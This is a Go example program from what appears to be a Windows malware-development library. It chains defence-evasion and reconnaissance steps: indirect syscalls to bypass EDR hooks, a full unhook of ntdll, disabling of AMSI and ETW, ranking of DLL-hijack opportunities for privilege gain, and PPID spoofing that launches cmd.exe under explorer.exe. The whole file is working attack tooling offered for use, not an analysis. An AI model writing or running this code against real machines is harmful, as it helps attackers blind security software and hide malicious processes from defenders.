//go:build windows

// stealth-recon-ppid — example assembled from the user-facing markdown docs only.
//
// Combines:
//   - win/syscall: Tartarus SSN resolver + MethodIndirectAsm calling method
//     (per docs/techniques/syscalls/{ssn-resolvers,direct-indirect}.md)
//   - evasion/stealthopen: NewStealth(path) opener, threaded through every
//     consumer that the docs say accepts an Opener
//     (per docs/techniques/evasion/stealthopen.md, "Where it's wired today")
//   - evasion/preset: Stealth preset applied through the same caller
//     (per docs/techniques/evasion/preset.md)
//   - recon/dllhijack: ScanAll + Rank to surface hijack opportunities
//     (per docs/techniques/recon/dll-hijack.md)
//   - c2/shell: PPID spoofing for the spawned child
//     (per docs/techniques/evasion/ppid-spoofing.md)
package main

import (
	"fmt"
	"log"
	"os/exec"

	"golang.org/x/sys/windows"

	"github.com/oioio-space/maldev/c2/shell"
	"github.com/oioio-space/maldev/evasion"
	"github.com/oioio-space/maldev/evasion/preset"
	"github.com/oioio-space/maldev/evasion/stealthopen"
	"github.com/oioio-space/maldev/evasion/unhook"
	"github.com/oioio-space/maldev/recon/dllhijack"
	wsyscall "github.com/oioio-space/maldev/win/syscall"
)

func main() {
	// 1. Resilient caller: Tartarus (handles JMP hooks) + IndirectAsm
	//    (no heap stub, no VirtualProtect dance).
	caller := wsyscall.New(wsyscall.MethodIndirectAsm, wsyscall.NewTartarus())
	defer caller.Close()

	// 2. Stealth opener — path-free reads via NTFS Object ID.
	//    Per stealthopen.md, NewStealth derives volume + ObjectID in one call.
	stealth, err := stealthopen.NewStealth(`C:\Windows\System32\ntdll.dll`)
	if err != nil {
		log.Printf("stealth opener unavailable (%v) — falling back to path-based reads", err)
		stealth = nil
	}

	// 3. Full ntdll unhook with the stealth opener as the 2nd arg
	//    (per stealthopen.md "Where it's wired today" table).
	if err := unhook.FullUnhook(caller, stealth); err != nil {
		log.Printf("FullUnhook failed: %v", err)
	}

	// 4. Apply preset.Stealth — AMSI + ETW + 10x classic unhook through caller.
	if errs := evasion.ApplyAll(preset.Stealth(), caller); len(errs) > 0 {
		for name, e := range errs {
			log.Printf("preset.Stealth: %s: %v", name, e)
		}
	}

	// 5. DLL-hijack recon — list top 5 ranked opportunities.
	opps, err := dllhijack.ScanAll()
	if err != nil {
		log.Printf("dllhijack.ScanAll: %v", err)
	}
	fmt.Println("\n=== Top DLL-hijack opportunities ===")
	ranked := dllhijack.Rank(opps)
	n := len(ranked)
	if n > 5 {
		n = 5
	}
	for _, o := range ranked[:n] {
		fmt.Printf("kind=%v id=%v name=%v hijack=%s resolved=%s gain=%v ae=%v\n",
			o.Kind, o.ID, o.DisplayName,
			o.HijackedPath, o.ResolvedDLL, o.IntegrityGain, o.AutoElevate)
	}

	// 6. PPID spoofing — spawn `whoami` under explorer.exe.
	spoofer := shell.NewPPIDSpoofer()
	if err := spoofer.FindTargetProcess(); err != nil {
		log.Fatalf("PPID spoof: %v", err)
	}
	fmt.Printf("\n=== PPID spoofing — target PID %d ===\n", spoofer.TargetPID())

	attr, parentHandle, err := spoofer.SysProcAttr()
	if err != nil {
		log.Fatalf("PPID spoof SysProcAttr: %v", err)
	}
	defer windows.CloseHandle(parentHandle)

	cmd := exec.Command("cmd.exe", "/c", "whoami")
	cmd.SysProcAttr = attr
	out, err := cmd.Output()
	if err != nil {
		log.Fatalf("spawn: %v", err)
	}
	fmt.Printf("whoami output: %s\n", out)
}
